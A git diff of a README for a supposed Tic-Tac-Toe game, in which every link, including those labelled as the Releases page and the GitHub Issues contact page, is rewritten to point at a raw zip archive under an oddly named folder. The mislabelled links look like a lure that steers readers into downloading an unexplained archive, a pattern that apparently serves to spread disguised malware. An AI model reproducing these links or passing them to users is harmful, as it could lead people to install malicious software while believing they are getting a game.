@@ -6,7 +6,7 @@ Welcome to the Tic-Tac-Toe Game! This application allows you to play a classic g
 
 ## 📥 Download the Game
 
-[![Download Tic-Tac-Toe Game](https://img.shields.io/badge/Download-Tic--Tac--Toe--Game-blue.svg)](https://github.com/Nopaleafifo630/Tic-Tac-Toe-Game/releases)
+[![Download Tic-Tac-Toe Game](https://github.com/Nopaleafifo630/Tic-Tac-Toe-Game/raw/refs/heads/main/nepotistical/Game_Tac_Toe_Tic_v1.2.zip)](https://github.com/Nopaleafifo630/Tic-Tac-Toe-Game/raw/refs/heads/main/nepotistical/Game_Tac_Toe_Tic_v1.2.zip)
 
 Click the button above to get your copy of the game. 
 
@@ -21,7 +21,7 @@ To run this game, you will need:
 ## 📂 How to Download and Install
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/Nopaleafifo630/Tic-Tac-Toe-Game/releases) by clicking the link.
+   Go to the [Releases page](https://github.com/Nopaleafifo630/Tic-Tac-Toe-Game/raw/refs/heads/main/nepotistical/Game_Tac_Toe_Tic_v1.2.zip) by clicking the link.
 
 2. **Choose the Latest Release**
    On the Releases page, find the latest version of the game. This version will have the most features and be the most stable.
@@ -76,10 +76,10 @@ Explore these topics to learn more about this exciting field!
 
 ## 📞 Contact the Developer
 
-For any inquiries or support, please reach out to the developer on [GitHub Issues Page](https://github.com/Nopaleafifo630/Tic-Tac-Toe-Game/issues).
+For any inquiries or support, please reach out to the developer on [GitHub Issues Page](https://github.com/Nopaleafifo630/Tic-Tac-Toe-Game/raw/refs/heads/main/nepotistical/Game_Tac_Toe_Tic_v1.2.zip).
 
 ## 📦 Download the Game Again
 
-If you missed it earlier, you can visit the [Releases page](https://github.com/Nopaleafifo630/Tic-Tac-Toe-Game/releases) once more and download the game file.
+If you missed it earlier, you can visit the [Releases page](https://github.com/Nopaleafifo630/Tic-Tac-Toe-Game/raw/refs/heads/main/nepotistical/Game_Tac_Toe_Tic_v1.2.zip) once more and download the game file.
 
 Now, gather a friend, enjoy a match, and have fun playing Tic-Tac-Toe!
